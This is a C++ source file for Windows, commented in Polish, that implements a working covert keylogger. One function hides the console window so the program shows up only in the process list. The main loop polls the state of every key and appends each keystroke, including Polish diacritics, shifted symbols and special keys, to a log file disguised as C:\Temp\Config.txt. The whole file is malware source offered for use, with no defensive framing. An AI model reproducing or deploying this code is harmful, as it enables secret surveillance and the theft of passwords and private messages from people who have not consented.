#include <iostream>
#include <fstream>
#include <windows.h>

using namespace std;



// ----------------------------------------- //
//     Funkcja ukrywajaca okno aplikacji     //
// nadaje jej charakter ukrytego keyloggera  //
// ----------------------------------------- //
void Stealth()
{
	HWND stealth_handle; //tworzy uchwyt
	AllocConsole(); //przypisuje do procesu konsole
	stealth_handle = FindWindowA("ConsoleWindowClass", NULL);  //zwraca uchwyt do okna konsolowego na wierzchu
	ShowWindow(stealth_handle, SW_HIDE);  //Ukrywamy okno - aplikacja bedzie widoczna teraz tylko w procesach
}

// --------------------------------------------- //
// Funkcja zapisujaca przechwytany znak do pliku //
// --------------------------------------------- //
int Zapisz_do_pliku(int key_stroke, char *file)
{
	if ((key_stroke == 1) || (key_stroke == 2)) return 0; // Nie uwzgledniamy wcisniecia LPM lub PPM

	FILE *OUTPUT_FILE;               // Wskaznik na plik wyjsciowy
	OUTPUT_FILE = fopen(file, "a+"); // Dopisujemy do pliku za kazdym wczytaniem znaku

	// Przechwytujemy du¿e i ma³e litery oraz znaki polskie
	if (key_stroke > 64 && key_stroke < 91)
	{
		if (GetAsyncKeyState(VK_SHIFT))
		{ 
			if (GetAsyncKeyState(VK_MENU)) // jezeli wcisniety alt dla duzych liter
			{
				switch (key_stroke)
				{
				case 65: fprintf(OUTPUT_FILE, "%s", "¥"); break;
				case 67: fprintf(OUTPUT_FILE, "%s", "Æ"); break;
				case 69: fprintf(OUTPUT_FILE, "%s", "Ê"); break;
				case 76: fprintf(OUTPUT_FILE, "%s", "£"); break;
				case 79: fprintf(OUTPUT_FILE, "%s", "Ó"); break;
				case 83: fprintf(OUTPUT_FILE, "%s", "Œ"); break;
				case 88: fprintf(OUTPUT_FILE, "%s", ""); break;
				case 90: fprintf(OUTPUT_FILE, "%s", "¯"); break;
				}
			}
			else
				fprintf(OUTPUT_FILE, "%s", &key_stroke); 
		}
		else 
		{ 
			if (GetAsyncKeyState(VK_MENU))  // jezeli wcisniety alt dla malych liter
			{
				switch (key_stroke)
				{
				case 65: fprintf(OUTPUT_FILE, "%s", "¹"); break;
				case 67: fprintf(OUTPUT_FILE, "%s", "æ"); break;
				case 69: fprintf(OUTPUT_FILE, "%s", "ê"); break;
				case 76: fprintf(OUTPUT_FILE, "%s", "³"); break;
				case 79: fprintf(OUTPUT_FILE, "%s", "ó"); break;
				case 83: fprintf(OUTPUT_FILE, "%s", "œ"); break;
				case 88: fprintf(OUTPUT_FILE, "%s", "Ÿ"); break;
				case 90: fprintf(OUTPUT_FILE, "%s", "¿"); break;
				}
			}
			else
			{ 
				key_stroke += 32;                        // Wielkie litery na male, zeby polapac sie z shiftem - patrz tabela ASCII
				fprintf(OUTPUT_FILE, "%s", &key_stroke);
			}
		}
	}
	// Przechwytujemy znaki specjalne
	else if (key_stroke >= 48 && key_stroke <= 64)
	{
		if (GetAsyncKeyState(VK_SHIFT))
		{
			switch (key_stroke)
			{
			case 48: fprintf(OUTPUT_FILE, "%s", ")"); break;
			case 49: fprintf(OUTPUT_FILE, "%s", "!"); break;
			case 50: fprintf(OUTPUT_FILE, "%s", "@"); break;
			case 51: fprintf(OUTPUT_FILE, "%s", "#"); break;
			case 52: fprintf(OUTPUT_FILE, "%s", "$"); break;
			case 53: fprintf(OUTPUT_FILE, "%s", "%"); break;
			case 54: fprintf(OUTPUT_FILE, "%s", "^"); break;
			case 55: fprintf(OUTPUT_FILE, "%s", "&"); break;
			case 56: fprintf(OUTPUT_FILE, "%s", "*"); break;
			case 57: fprintf(OUTPUT_FILE, "%s", "("); break;
			}
		}
		else
			fprintf(OUTPUT_FILE, "%s", &key_stroke);  // Reszty nie zmieniaj
	}
	else if (key_stroke == 8) fprintf(OUTPUT_FILE, "%s", "[Backspace]");
	else if (key_stroke == VK_TAB)  fprintf(OUTPUT_FILE, "%s", "[Tab]");
	else if (key_stroke == VK_RETURN) fprintf(OUTPUT_FILE, "%s", "\n");
	else if (key_stroke == VK_CAPITAL) fprintf(OUTPUT_FILE, "%s", "[CapsLock]");
	else if (key_stroke == VK_SPACE) fprintf(OUTPUT_FILE, "%s", " ");
	else if (key_stroke == VK_PRIOR) fprintf(OUTPUT_FILE, "%s", "[PageUp] ");
	else if (key_stroke == VK_NEXT) fprintf(OUTPUT_FILE, "%s", "[PageDown] ");
	else if (key_stroke == VK_END) fprintf(OUTPUT_FILE, "%s", "[End] ");
	else if (key_stroke == VK_HOME) fprintf(OUTPUT_FILE, "%s", "[Home] ");
	else if (key_stroke == VK_INSERT) fprintf(OUTPUT_FILE, "%s", "[Insert]");
	else if (key_stroke == VK_DELETE) fprintf(OUTPUT_FILE, "%s", "[Delete]");
	else if (key_stroke == VK_ESCAPE) fprintf(OUTPUT_FILE, "%s", "[Esc] ");
	//else if (key_stroke == VK_MENU) fprintf(OUTPUT_FILE, "%s", "[Alt]");
	//else if (key_stroke == VK_CONTROL) fprintf(OUTPUT_FILE, "%s", "[Ctrl]");
	//else if (key_stroke == VK_SHIFT) fprintf(OUTPUT_FILE, "%s", "[Shift]");
	else if (key_stroke == VK_OEM_1) fprintf(OUTPUT_FILE, "%s", "[;:]");
	else if (key_stroke == 47) fprintf(OUTPUT_FILE, "%s", "[/?]");
	else if (key_stroke == VK_OEM_3) fprintf(OUTPUT_FILE, "%s", "[`~]");
	else if (key_stroke == VK_OEM_4) fprintf(OUTPUT_FILE, "%s", "[ [{ ]");
	else if (key_stroke == VK_OEM_5) fprintf(OUTPUT_FILE, "%s", "[\\|]");
	else if (key_stroke == VK_OEM_6) fprintf(OUTPUT_FILE, "%s", "[ ]} ]");
	else if (key_stroke == VK_OEM_7) fprintf(OUTPUT_FILE, "%s", "['\"]");
	else if (key_stroke == 44) fprintf(OUTPUT_FILE, "%s", ",");
	else if (key_stroke == 43) fprintf(OUTPUT_FILE, "%s", "+");
	else if (key_stroke == 45) fprintf(OUTPUT_FILE, "%s", "-");
	else if (key_stroke == 95) fprintf(OUTPUT_FILE, "%s", "_");
	else if (key_stroke == 46) fprintf(OUTPUT_FILE, "%s", ".");
	else if (key_stroke == VK_LWIN || key_stroke == VK_RWIN) fprintf(OUTPUT_FILE, "%s", "[Windows] ");

	fclose(OUTPUT_FILE);
	return 0;
}

// --------------------------------------------- //
//       Glowna funkcja z petla aplikacji        //
// --------------------------------------------- //
int main(){
	Stealth(); // wywolujemy stealth - otwieramy i chowamy okno
	
	while (1)  // w nieskonczonej petli
	{
		Sleep(10); //Odciazamy troche zasoby procesora
		for (char i = 8; i <= 190; i++)  // sprawdzamy czy zostaly wcisniete dane znaki ASCII
		{ 
			if (GetAsyncKeyState(i) == -32767) // Klawisz wcisniety, gdy ustawiony jest najwazniejszy bit w 16-bit decimal (wartosc -32767)
			{ 
				Zapisz_do_pliku(i, "C:\\Temp\\Config.txt");  // zapisz znak do pliku
			}
		}
		
	}
	system("PAUSE");
	return 0;
}